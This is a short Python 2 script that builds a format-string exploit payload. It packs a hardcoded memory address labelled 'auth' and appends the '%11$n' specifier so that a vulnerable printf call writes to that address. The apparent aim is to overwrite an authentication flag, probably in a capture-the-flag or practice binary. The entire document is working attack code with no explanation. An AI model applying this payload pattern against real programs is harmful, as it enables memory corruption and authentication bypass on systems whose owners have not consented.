import struct

auth = 0x0804a04c

exploit = ""
exploit += struct.pack('I', auth)
exploit += "%11$n"

print exploit